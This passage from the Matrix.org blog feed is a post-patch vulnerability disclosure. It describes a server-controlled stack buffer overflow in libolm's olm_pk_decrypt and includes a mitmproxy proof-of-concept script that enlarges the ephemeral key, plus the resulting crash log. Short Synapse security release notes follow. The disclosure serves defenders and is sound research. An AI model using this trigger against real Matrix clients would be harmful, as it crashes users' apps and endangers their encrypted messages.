was again no way of leaking the data to the attacker.&lt;&#x2F;p&gt;
&lt;p&gt;In conclusion, even though this invalid read is a valid bug, I was not able to
find a working exploit for it.&lt;&#x2F;p&gt;
&lt;p&gt;But wait a second! Something was still bothering me about &lt;code&gt;olm_pk_decrypt&lt;&#x2F;code&gt;.
It&#x27;s a fairly complex function, &lt;em&gt;receives several string inputs from the
homeserver&lt;&#x2F;em&gt; and it itself isn&#x27;t tested by any of the harnesses. Furthermore,
the reason I started looking at it in the first place is that it was missing
the &lt;code&gt;olm::decode_base64_length&lt;&#x2F;code&gt; check. Perhaps it warrants a closer look?&lt;&#x2F;p&gt;
&lt;h2 id=&quot;it-does&quot;&gt;It does&lt;&#x2F;h2&gt;
&lt;p&gt;And sure enough, there was something amiss. As &lt;code&gt;olm_pk_decrypt&lt;&#x2F;code&gt; receives three
base64 inputs from the homeserver: the ciphertext to decrypt, an ephemeral
public key and a MAC. All three are eventually passed to &lt;code&gt;olm::decode_base64&lt;&#x2F;code&gt;
to be decoded. Yet there was only a single length check there, to ensure the
decrypted ciphertext would fit its output buffer. What would happen if the
server returned a public key that was longer than expected?&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c++&quot; style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot; class=&quot;language-c++ &quot;&gt;&lt;code class=&quot;language-c++&quot; data-lang=&quot;c++&quot;&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span&gt; _olm_curve25519_public_key ephemeral;
&lt;&#x2F;span&gt;&lt;span&gt;olm::decode_base64(
&lt;&#x2F;span&gt;&lt;span&gt;    (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span&gt;uint8_t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)ephemeral_key, ephemeral_key_length,
&lt;&#x2F;span&gt;&lt;span&gt;    (uint8_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)ephemeral.public_key
&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As can be seen from the snippet, the decoded version of public key gets written
to &lt;code&gt;ephemeral.public_key&lt;&#x2F;code&gt;, which is an array allocated on the stack. If the
input is longer than expected, this will become a stack buffer overflow.&lt;&#x2F;p&gt;
&lt;p&gt;The purpose of &lt;code&gt;olm_pk_decrypt&lt;&#x2F;code&gt; is to decrypt secrets previously stored by
a Matrix device on the homeserver. The point of encryption is to prevent the
server from learning these secrets since they&#x27;re supposed to be known only by
your own devices. One use case for this mechanism is to allow one of your
devices to store encrypted end-to-end encryption keys on the homeserver. Your
other devices can then retrieve those keys from the homeserver, making it
possible to view all of your private conversations on each of your devices.&lt;&#x2F;p&gt;
&lt;p&gt;I decided to go for an end-to-end test to confirm the bug is triggerable by
connecting with the latest Element Android from my test phone to my homeserver,
with &lt;a href=&quot;https:&#x2F;&#x2F;mitmproxy.org&#x2F;&quot;&gt;mitmproxy&lt;&#x2F;a&gt; sitting in between. This allowed me to
write a small mitmproxy script which intercepts HTTP calls fetching the E2E
encryption keys from the homeserver and modifies the response so that the key
is longer than expected.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#9b9b9b;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;json
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#9b9b9b;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;mitmproxy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#9b9b9b;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;ctx, http
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span&gt;response(flow: http.HTTPFlow) -&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;None&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;&#x2F;_matrix&#x2F;client&#x2F;unstable&#x2F;room_keys&#x2F;keys&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;flow.request.pretty_url
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;flow.request.method == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;GET&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        response_body = flow.response.content.decode(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        response_json = json.loads(response_body)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        rooms = response_json[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;rooms&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;        room_id = list(rooms.keys())[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        sessions = rooms[room_id][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;sessions&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;        session = list(sessions.keys())[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;        session_data = sessions[session][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;session_data&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        ephemeral = session_data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;ephemeral&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;        ctx.log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#569cd6;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;Replacing ephemeral key &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;{ephemeral}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;#39; with &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;{ephemeral * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;#39;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        session_data[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;ephemeral&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;] = ephemeral * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b5cea8;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        modified_body = json.dumps(response_json).encode(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d69d85;&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        flow.response.content = modified_body
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This longer value is then eventually passed by Element Android to libolm&#x27;s
&lt;code&gt;olm_pk_decrypt&lt;&#x2F;code&gt;, which triggers the buffer overflow. With all of that in
place, I deleted the local encryption key backup on my device and asked for it
to be restored from the server:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;F libc    : stack corruption detected (-fstack-protector)
&lt;&#x2F;span&gt;&lt;span&gt;F libc    : Fatal signal 6 (SIGABRT), code -6 (SI_TKILL) in tid 24517 (DefaultDispatch), pid 24459 (im.vector.app)
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : Build fingerprint: &amp;#39;xiaomi&#x2F;tissot&#x2F;tissot_sprout:9&#x2F;PKQ1.180917.001&#x2F;V10.0.24.0.PDHMIXM:user&#x2F;release-keys&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : Revision: &amp;#39;0&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : ABI: &amp;#39;arm64&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : pid: 24459, tid: 24517, name: DefaultDispatch  &amp;gt;&amp;gt;&amp;gt; im.vector.app &amp;lt;&amp;lt;&amp;lt;
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   : Abort message: &amp;#39;stack corruption detected (-fstack-protector)&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x0  0000000000000000  x1  0000000000005fc5  x2  0000000000000006  x3  0000000000000008
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x4  0000000000000000  x5  0000000000000000  x6  0000000000000000  x7  0000000000000030
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x8  0000000000000083  x9  7d545b4513138652  x10 0000000000000000  x11 fffffffc7ffffbdf
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x12 0000000000000001  x13 0000000060b0f2a9  x14 0022ed916fede200  x15 0000d925cd93f18f
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x16 00000079e741b2b0  x17 00000079e733c9d8  x18 0000000000000000  x19 0000000000005f8b
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x20 0000000000005fc5  x21 0000007940e3c400  x22 000000000000026b  x23 00000000000001d0
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x24 000000000000002f  x25 000000793d9653f0  x26 0000007948303368  x27 0000007945dd5588
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     x28 00000000000001d0  x29 0000007945dd37d0
&lt;&#x2F;span&gt;&lt;span&gt;F DEBUG   :     sp  0000007945dd3790  lr  00000079e732e00c  pc  00000079e732e034
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;impact&quot;&gt;Impact&lt;&#x2F;h3&gt;
&lt;p&gt;This vulnerability is a server-controlled stack buffer overflow in Matrix
clients supporting room key backup.&lt;&#x2F;p&gt;
&lt;p&gt;Of course, the largest fear stemming from any remotely controlled stack buffer
overflow is code execution. This is perhaps even doubly so in a cryptographic
library, where we have the additional worry of an attacker being able to leak
our dearly protected conversations.&lt;&#x2F;p&gt;
&lt;p&gt;The federated architecture of Matrix may be somewhat of a mitigating
circumstance in this case, since users are much more likely to know and trust
the homeserver owner, but we don&#x27;t want to have to rely on this trust.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;native-binaries&quot;&gt;Native binaries&lt;&#x2F;h4&gt;
&lt;p&gt;Luckily, on its own, this bug is not enough to successfully execute code on
native binaries. By default, libolm is compiled for all supported targets with
stack canaries (also called stack protectors or stack cookies), which are magic
values unknown to the attacker, placed just before the current function&#x27;s frame
on the stack. This value is checked upon returning from the function -- if its
value is changed, the process aborts itself to prevent further damage. This is
evident from the &lt;code&gt;Abort message: &#x27;stack corruption detected (-fstack-protector)&#x27;&lt;&#x2F;code&gt; message above. Besides canaries, other system-level
protections exist to make exploiting bugs such as this harder, such as ASLR.&lt;&#x2F;p&gt;
&lt;p&gt;Therefore, to achieve remote code execution, an attacker would need to find
additional vulnerabilities which would allow him to exfiltrate the stack canary
and addresses of key memory locations from the system.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;wasm&quot;&gt;WASM&lt;&#x2F;h4&gt;
&lt;p&gt;With WASM, the analysis is much more complicated due to its very different
memory and execution model. In WASM, the unmanaged stack is generally much more
vulnerable due to it missing support for stack canaries. This implies a stack
buffer overflow can not only overwrite the frame of the function in which the
overflow occurred but also &lt;em&gt;all parent frames&lt;&#x2F;em&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;On the other hand, due to typed calls and much stronger control-flow integrity
techniques, it&#x27;s much harder for the attacker to make the code do something
that is (maliciously) useful. Notably, return addresses live outside unmanaged
memory and are out of reach to the attacker. Because of this, the primary way
of influencing code execution is by manipulating &lt;code&gt;call_indirect&lt;&#x2F;code&gt; instructions
in such a way as to call.&lt;&#x2F;p&gt;
&lt;p&gt;The analysis of the impact of this bug on the WASM binary is thus left as an
exercise to the reader. If you&#x27;re interested, the 2020 USENIX paper &lt;a href=&quot;https:&#x2F;&#x2F;www.usenix.org&#x2F;conference&#x2F;usenixsecurity20&#x2F;presentation&#x2F;lehmann&quot;&gt;Everything
Old is New Again: Binary Security of WebAssembly&lt;&#x2F;a&gt;
is a great starting point.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;the-fix&quot;&gt;The fix&lt;&#x2F;h2&gt;
&lt;p&gt;Once the problems were identified, &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;-&#x2F;commit&#x2F;e82f2601b0dc2a69d3167499ee969555267b7aa6&quot;&gt;the patches&lt;&#x2F;a&gt; were &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;-&#x2F;commit&#x2F;ccc0d122ee1b4d5e5ca4ec1432086be17d5f901b&quot;&gt;rather
trivial&lt;&#x2F;a&gt; and the issues were promptly resolved. The first libolm
release that includes the fix is 3.2.3 which was released on 2021-05-25.&lt;&#x2F;p&gt;
&lt;p&gt;We reached out to all Matrix clients which were determined to be affected. The
Element client versions which first fix the issue are as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Element Web&#x2F;Desktop: v1.7.29&lt;&#x2F;li&gt;
&lt;li&gt;Element Android: v1.1.9&lt;&#x2F;li&gt;
&lt;li&gt;Element iOS: v1.4.0&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;For the mobile clients, these versions are already available in their
respective application stores at the time of publishing this post. If you
haven&#x27;t already, please upgrade.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;future-work&quot;&gt;Future work&lt;&#x2F;h2&gt;
&lt;p&gt;Even though the fuzzing setup is in a much better shape now (or rather will be,
since I still have some PRs to merge upstream), there&#x27;s still a lot that can be
done to further improve it.&lt;&#x2F;p&gt;
&lt;p&gt;Right now, there are undoubtedly parts of the codebase that are not fuzzed
well. The reasons for this range from the obvious, like some parts of the code
simply not being called by any the existing harnesses, to more subtle ones such
as the fact that cryptographic operations form a nearly-insurmountable natural
barrier for naive fuzzing operations&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;. Finally, some of
the existing harnesses accept additional parameters as command-line arguments,
meaning we would have to re-run the same harness with different values of those
parameters in order to reach full coverage of the code. This is suboptimal.&lt;&#x2F;p&gt;
&lt;p&gt;So the plan for future work is roughly as follows:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Write missing harnesses to cover more portions of the codebase.&lt;&#x2F;li&gt;
&lt;li&gt;Write starting corpus generators. These should generate believable, valid
input for each of the harnesses. For example, for the decryption harness, we
should generate a variety of encrypted messages: empty, short, long, text,
binary, etc.&lt;&#x2F;li&gt;
&lt;li&gt;Modify the harnesses so that their extra parameters are determined from the
fuzzed input. This will allow the fuzzer to vary these itself, which reduces
the importance of the human in the loop and makes it harder to forget some
combination.&lt;&#x2F;li&gt;
&lt;li&gt;Fuzz for some time until coverage stops increasing. The corpora generated
should be saved so that future fuzzing attempts can resume from an earlier
point so that this work is not wasted.&lt;&#x2F;li&gt;
&lt;li&gt;Use afl-cov to investigate which parts of the code are not covered well or
at all. This should inform us what further changes are needed.&lt;&#x2F;li&gt;
&lt;li&gt;Write intelligent, custom mutators. These will allow the fuzzer to take
a valid input and easily produce another valid input instead of only
corrupting it with a high probability.&lt;&#x2F;li&gt;
&lt;li&gt;Design harnesses which test for wanted semantic properties instead of only
memory errors.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;div class=&quot;footnote-definition&quot; id=&quot;3&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;3&lt;&#x2F;sup&gt;
&lt;p&gt;Classic fuzzers famously have a hard time
circumventing magic values and checksums, and cryptography is full of these.
This is further complicated by the fact that the double ratchet algorithm is
very stateful and depends on the two ratchets evolving in lockstep. This
means that even if, for example, the decryption harness is supplied with
a corpus of valid encrypted messages, the mutations done by the fuzzer would
only manage to produce corrupted versions of those messages which will fail
to decrypt, but it will ~never manage to produce a different &lt;em&gt;valid&lt;&#x2F;em&gt;
encrypted message.&lt;&#x2F;p&gt;
&lt;&#x2F;div&gt;
&lt;p&gt;It&#x27;s very exciting that we&#x27;re able to do full-time security research on Matrix
these days (thanks to Element&#x27;s funding), and going forwards we&#x27;ll publish any
interesting discoveries for the visibility and education of the whole Matrix
community. We&#x27;d also like to remind everyone that we run an official &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security
Disclosure Policy&lt;&#x2F;a&gt; for
Matrix.org and we&#x27;d welcome other researchers to come join our Hall of Fame!
(And hopefully we will get more bounty programmes running in future.)&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.33.2 released</title>
		<published>2021-05-11T23:53:39+00:00</published>
		<updated>2021-05-11T23:53:39+00:00</updated>
		<link rel="alternate" href="/blog/2021/05/11/synapse-1-33-2-released/" type="text/html"/>
		<id>/blog/2021/05/11/synapse-1-33-2-released/</id>
		<content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.33.2&quot;&gt;Synapse 1.33.2&lt;&#x2F;a&gt; is now available.&lt;&#x2F;p&gt;
&lt;p&gt;This release fixes a denial of service issue (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-x345-32rc-8h85&quot;&gt;CVE-2021-29471&lt;&#x2F;a&gt;) where evaluating specially crafted push rules could lead to excessive CPU load. Server administrators are encouraged to upgrade.&lt;&#x2F;p&gt;
&lt;p&gt;To learn more about Synapse 1.33, see last week&#x27;s &lt;a href=&quot;&#x2F;blog&#x2F;2021&#x2F;05&#x2F;05&#x2F;synapse-1-33-0-released&quot;&gt;release announcement&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.30.1 released</title>
		<published>2021-03-26T16:12:04+00:00</published>
		<updated>2021-03-26T16:12:04+00:00</updated>
		<link rel="alternate" href="/blog/2021/03/26/synapse-1-30-1-released/" type="text/html"/>
		<id>/blog/2021/03/26/synapse-1-30-1-released/</id>
		<content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.30.1&quot;&gt;Synapse 1.30.1&lt;&#x2F;a&gt; is now available. This release is identical to Synapse 1.30.0, with the exception of explicitly setting a minimum version of the Python Cryptography library to ensure that users of Synapse are protected from yesterday&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;mta.openssl.org&#x2F;pipermail&#x2F;openssl-announce&#x2F;2021-March&#x2F;000198.html&quot;&gt;OpenSSL security advisories&lt;&#x2F;a&gt;, especially CVE-2021-3449.&lt;&#x2F;p&gt;
&lt;p&gt;Note that Cryptography defaults to bundling its own statically linked copy of OpenSSL, which means that you may not be protected by your operating system&#x27;s security updates.&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s also worth noting that Cryptography no longer supports Python 3.5, so admins deploying to older environments like Debian 9 (Stretch) or Ubuntu 16.04 (Xenial) may not be protected against this or future vulnerabilities.&lt;&#x2F;p&gt;
&lt;p&gt;The next release of Synapse will be the last to support Python 3.5.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.24.0 and 1.23.1 released</title>
		<published>2020-12-09T23:51:05+00:00</published>
		<updated>2020-12-09T23:51:05+00:00</updated>
		<link rel="alternate" href="/blog/2020/12/09/synapse-1-24-0-and-1-23-1-released/" type="text/html"/>
		<id>/blog/2020/12/09/synapse-1-24-0-and-1-23-1-released/</id>
		<content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.24.0&quot;&gt;Synapse 1.24.0&lt;&#x2F;a&gt; is now available!&lt;&#x2F;p&gt;
&lt;p&gt;This release fixes a denial of service vulnerability (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-hxmp-pqch-c8mm&quot;&gt;GHSA-hxmp-pqch-c8mm&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2020-26257&quot;&gt;CVE-2020-26257&lt;&#x2F;a&gt;) in which a malicious homeserver could send malformed events into a room which would then break federation of that room.&lt;&#x2F;p&gt;
&lt;p&gt;This follows the disclosure of a denial of service vulnerability in OpenSSL (&lt;a href=&quot;https:&#x2F;&#x2F;www.openssl.org&#x2F;news&#x2F;secadv&#x2F;20201208.txt&quot;&gt;CVE-2020-1971&lt;&#x2F;a&gt;). If you have installed Synapse from source, please ensure your host is up to date and then execute &lt;code&gt;pip install &#x27;cryptography&amp;gt;=3.3&#x27;&lt;&#x2F;code&gt; inside your Synapse virtualenv.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve also released &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.23.1&quot;&gt;Synapse 1.23.1&lt;&#x2F;a&gt; which includes that security fix and a small patch to maintain Python 3.5 compatibility. It is otherwise &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;compare&#x2F;v1.23.0...v1.23.1&quot;&gt;identical to 1.23.0&lt;&#x2F;a&gt;. Note that Synapse 1.24.0 includes backwards incompatible changes which may affect a small number of users. See the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;develop&#x2F;UPGRADE.rst#upgrading-to-v1240&quot;&gt;notes on upgrading&lt;&#x2F;a&gt; for more information.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse 1.24.0 brings a pair of new Admin APIs, including a way to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;v1.24.0&#x2F;docs&#x2F;admin_api&#x2F;user_admin_api.rst#login-as-a-user&quot;&gt;log in as users&lt;&#x2F;a&gt; and to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;v1.24.0&#x2F;docs&#x2F;admin_api&#x2F;rooms.md#delete-room-api&quot;&gt;forcibly purge&lt;&#x2F;a&gt; rooms when deleting them. We&#x27;ve also made numerous bug fixes and improvements to SSO support, especially around OpenID Connect and SAML providers.&lt;&#x2F;p&gt;
&lt;p&gt;This release includes an optional change to push notification badges: currently, the number in the badge is based on the count of &lt;em&gt;rooms&lt;&#x2F;em&gt; with unread messages. However, in some specialized cases you may want the badge to show the count of &lt;em&gt;all&lt;&#x2F;em&gt; unread messages, even if there are multiple unread messages in the same room. This behavior can now be toggled with a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;8820&quot;&gt;new configuration setting&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Additionally, for server admins, the deprecated &lt;code&gt;&#x2F;_matrix&#x2F;client&#x2F;*&#x2F;admin&lt;&#x2F;code&gt; Admin API endpoints &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;8785&quot;&gt;have been removed&lt;&#x2F;a&gt;. If you have tools which target these endpoints, please update them to use the &lt;code&gt;&#x2F;_synapse&#x2F;admin&lt;&#x2F;code&gt; URL prefix instead.&lt;&#x2F;p&gt;
&lt;p&gt;See the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;v1.24.0&#x2F;CHANGES.md&quot;&gt;full changelog&lt;&#x2F;a&gt; for more.&lt;&#x2F;p&gt;
&lt;p&gt;Installation instructions are available &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;INSTALL.md&quot;&gt;on GitHub&lt;&#x2F;a&gt;, as is the &lt;code&gt;v1.24.0&lt;&#x2F;code&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.24.0&quot;&gt;release tag&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse is a Free and Open Source Software project, and we&#x27;d like to extend our thanks to everyone who contributed to this release, including &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;angdraug&quot;&gt;@angdraug&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chagai95&quot;&gt;@chagai95&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;daenney&quot;&gt;@daenney&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;dklimpel&quot;&gt;@dklimpel&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;jordanbancino&quot;&gt;@jordanbancino&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;localguru&quot;&gt;@localguru&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;nchamo&quot;&gt;@nchamo&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ShadowJonathan&quot;&gt;@ShadowJonathan&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TeFiLeDo&quot;&gt;@TeFiLeDo&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tulir&quot;&gt;@tulir&lt;&#x2F;a&gt;, and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;waylon531&quot;&gt;@waylon531&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse: Disclosing CVE-2020-26890</title>
		<published>2020-11-23T14:59:25+00:00</published>
		<updated>2020-11-23T14:59:25+00:00</updated>
		<link rel="alternate" href="/blog/2020/11/23/synapse-disclosing-cve-2020-26890/" type="text/html"/>
		<id>/blog/2020/11/23/synapse-disclosing-cve-2020-26890/</id>
